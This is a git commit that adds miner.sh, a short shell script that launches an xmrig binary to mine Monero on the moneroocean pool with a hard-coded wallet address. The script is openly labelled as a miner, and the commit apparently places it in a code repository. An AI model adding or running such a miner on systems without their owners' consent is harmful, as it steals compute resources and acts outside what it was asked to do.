145664883a762b7c116a99335586b66ddefabad8
newworking0 <supervpn290@gmail.com>
2025-06-14 11:04:10 +0530

    Create miner.sh

---
+++ miner.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+
+chmod +x xmrig/build/xmrig
+./xmrig/build/xmrig -o gulf.moneroocean.stream:10128 -u 47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh -a randomx -k --tls
